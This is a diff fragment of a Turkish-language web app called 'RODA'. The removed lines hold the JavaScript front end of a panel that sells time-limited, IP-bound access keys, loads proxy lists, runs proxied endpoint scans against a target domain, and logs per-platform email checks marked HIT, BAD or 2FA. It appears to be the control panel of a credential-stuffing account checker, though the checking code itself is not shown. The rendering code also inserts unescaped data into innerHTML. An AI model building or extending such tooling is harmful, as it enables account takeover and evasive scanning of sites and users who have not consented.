-        document.getElementById("statLast").innerText = new Date().toLocaleString();
-    }
-}
-
-function fetchProxies() {
-    document.getElementById("proxyCount").innerText = "Çekiliyor...";
-    fetch("/api/fetch_proxies")
-        .then(function(r) { return r.json(); })
-        .then(function(d) {
-            if (d.success) {
-                document.getElementById("proxyList").value = d.proxies.join("\n");
-                document.getElementById("proxyCount").innerText = d.proxies.length + " proxy yüklendi";
-            }
-        })
-        .catch(function(e) { document.getElementById("proxyCount").innerText = "Başarısız"; });
-}
-
-function clearProxies() {
-    document.getElementById("proxyList").value = "";
-    document.getElementById("proxyCount").innerText = "0 proxy";
-}
-
-function toggleProxy() { useProxy = document.getElementById("useProxy").checked; }
-
-function loadKeys() {
-    if (!isAdmin) return;
-    fetch("/api/admin/keys?key=" + encodeURIComponent(currentKey))
-        .then(function(r) { return r.json(); })
-        .then(function(d) {
-            if (d.error) { alert(d.error); return; }
-            var list = document.getElementById("keyList");
-            var html = "";
-            for (var k in d) {
-                var v = d[k];
-                var exp = v.expires ? new Date(v.expires).toLocaleString() : "Süresiz";
-                var ip = v.allowed_ip || "Herhangi";
-                html += '<div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid var(--border)"><div><strong style="font-size:13px">' + k + '</strong><br><small style="color:var(--muted);font-size:10px">' + v.note + ' | ' + exp + ' | IP: ' + ip + '</small></div><button class="btn sm r" onclick="deleteKey(\'' + k + '\')" style="padding:3px 10px;font-size:10px">Sil</button></div>';
-            }
-            list.innerHTML = html || '<p style="color:var(--muted);font-size:12px">Hiç key yok.</p>';
-        })
-        .catch(function(e) { console.error(e); });
-}
-
-function generateKey() {
-    if (!isAdmin) return;
-    var note = document.getElementById("genNote").value || "Oluşturuldu";
-    var value = parseInt(document.getElementById("genValue").value) || 24;
-    var unit = document.getElementById("genUnit").value;
-    var allowed_ip = document.getElementById("genIp").value.trim();
-    fetch("/api/admin/generate", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ master_key: currentKey, note: note, value: value, unit: unit, allowed_ip: allowed_ip })
-    })
-    .then(function(r) { return r.json(); })
-    .then(function(d) {
-        if (d.success) {
-            alert("Key Oluşturuldu!\n\nKey: " + d.key + "\nBitiş: " + d.expires + "\nIP: " + d.allowed_ip);
-            loadKeys();
-        } else alert("Başarısız: " + (d.error || ""));
-    })
-    .catch(function(e) { alert("Hata: " + e.message); });
-}
-
-function deleteKey(target) {
-    if (!isAdmin) return;
-    if (!confirm("Bu anahtarı sil?")) return;
-    fetch("/api/admin/delete", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ master_key: currentKey, target_key: target })
-    })
-    .then(function(r) { return r.json(); })
-    .then(function(d) {
-        if (d.success) loadKeys();
-        else alert("Silinemedi");
-    })
-    .catch(function(e) { alert("Hata: " + e.message); });
-}
-
-function loadLogs() {
-    if (!isAdmin) return;
-    fetch("/api/admin/logs?key=" + encodeURIComponent(currentKey))
-        .then(function(r) { return r.json(); })
-        .then(function(d) {
-            var tbody = document.getElementById("logsBody");
-            if (d.error || !d.length) {
-                tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;color:var(--muted);padding:20px">Henüz log yok.</td></tr>';
-                return;
-            }
-            var html = "";
-            d.slice().reverse().forEach(function(log) {
-                var cls = log.status.toLowerCase();
-                var label = log.status;
-                if (log.status === "HIT") label = "✅ BAŞARILI";
-                else if (log.status === "BAD") label = "❌ BAŞARISIZ";
-                else if (log.status === "2FA") label = "🔒 2FA";
-                else label = "⚠ " + log.status;
-                html += '<tr><td><span style="font-size:11px;font-family:monospace">' + log.key + '</span></td><td>' + log.platform + '</td><td>' + log.email + '</td><td><span class="chk-status ' + cls + '">' + label + '</span></td><td>' + log.time + '</td><td>' + log.ip + '</td></tr>';
-            });
-            tbody.innerHTML = html;
-        })
-        .catch(function(e) { console.error(e); });
-}
-
-function refreshLogs() { loadLogs(); }
-
-function clearLogs() {
-    if (!isAdmin) return;
-    if (!confirm("Tüm logları silmek istediğinize emin misiniz?")) return;
-    fetch("/api/admin/clear_logs", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ master_key: currentKey })
-    })
-    .then(function(r) { return r.json(); })
-    .then(function(d) {
-        if (d.success) { alert("Loglar temizlendi!"); loadLogs(); } else alert("Başarısız!");
-    })
-    .catch(function(e) { alert("Hata: " + e.message); });
-}
-
-function startScan() {
-    if (!isAdmin) { alert("⛔ Bu işlem sadece admin yetkilisine açıktır!"); return; }
-    if (scanning) return;
-    var domain = document.getElementById("targetDomain").value.trim();
-    if (!domain) return alert("Hedef domain girin");
-    var btn = document.getElementById("scanBtn");
-    btn.disabled = true;
-    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Taranıyor...';
-    scanning = true;
-    foundEndpoints = [];
-    document.getElementById("resultsList").innerHTML = "";
-    document.getElementById("statusDot").classList.remove("idle");
-    document.getElementById("statusText").innerText = "Taranıyor";
-    updateStatsUI();
-
-    var proxyList = document.getElementById("proxyList").value.trim().split("\n").filter(function(l) { return l.trim() && l.includes(":"); });
-    var url = "/api/scan?key=" + encodeURIComponent(currentKey) + "&domain=" + encodeURIComponent(domain) + "&use_proxy=" + useProxy;
-    if (useProxy && proxyList.length) {
-        url += "&proxies=" + encodeURIComponent(proxyList.join(","));
-    }
-    eventSource = new EventSource(url);
-    eventSource.onmessage = function(e) {
-        if (e.data === "[DONE]") {
-            eventSource.close();
-            btn.disabled = false;
-            btn.innerHTML = '<i class="fa-solid fa-play"></i> Tara';
-            scanning = false;
-            document.getElementById("statusDot").classList.add("idle");
-            document.getElementById("statusText").innerText = "Boşta";
-            document.getElementById("statScans").innerText = parseInt(document.getElementById("statScans").innerText || 0) + 1;
-            document.getElementById("statLast").innerText = new Date().toLocaleString();
-            updateStatsUI();
-            return;
-        }
-        try {
-            var res = JSON.parse(e.data);
-            foundEndpoints.push(res);
-            addResultRow(res);
-            updateStatsUI();
-        } catch (err) {}
-    };
-    eventSource.onerror = function() {
-        eventSource.close();
-        btn.disabled = false;
-        btn.innerHTML = '<i class="fa-solid fa-play"></i> Tara';
-        scanning = false;
-        document.getElementById("statusDot").classList.add("idle");
-        document.getElementById("statusText").innerText = "Boşta";
-    };
-}
-
-function addResultRow(res) {
-    var list = document.getElementById("resultsList");
-    var row = document.createElement("div");
-    row.className = "result-row";
-    var mc = res.method === "GET" ? "get" : (res.method === "POST" ? "post" : "other");
-    var cc = "cat-" + res.category.toLowerCase();
-    row.innerHTML = '<div><span class="method ' + mc + '">' + res.method + '</span></div><div>' + res.status + '</div><div style="word-break:break-all">' + res.url + '</div><div><span class="category ' + cc + '">' + res.category + '</span></div>';
-    var checked = Array.from(document.querySelectorAll("#filterContainer input:checked")).map(function(c) { return c.value; });
-    if (checked.includes(res.category)) list.appendChild(row);
-}
-
-document.getElementById("filterContainer").addEventListener("change", function() {
-    var checked = Array.from(this.querySelectorAll("input:checked")).map(function(c) { return c.value; });
-    var list = document.getElementById("resultsList");
-    list.innerHTML = "";
-    foundEndpoints.forEach(function(res) {
-        if (checked.includes(res.category)) {
-            var row = document.createElement("div");
-            row.className = "result-row";
-            var mc = res.method === "GET" ? "get" : (res.method === "POST" ? "post" : "other");
-            var cc = "cat-" + res.category.toLowerCase();
-            row.innerHTML = '<div><span class="method ' + mc + '">' + res.method + '</span></div><div>' + res.status + '</div><div style="word-break:break-all">' + res.url + '</div><div><span class="category ' + cc + '">' + res.category + '</span></div>';
-            list.appendChild(row);
-        }
-    });
-});
+    port = int(os.environ.get("PORT", 4000))
+    print(f"""
+    ╔══════════════════════════════════════════════════════════════════╗
+    ║     🔱 RODA - Render Free Uyumlu                              ║
+    ║     Port: {port}                                               ║
+    ║     HTML_TEMPLATE YOK - render_template kullanıyor            ║
+    ║     Admin Key: Gizlidir                                       ║
+    ╚══════════════════════════════════════════════════════════════════╝
+    """)
+    app.run(host="0.0.0.0", port=port, debug=False)
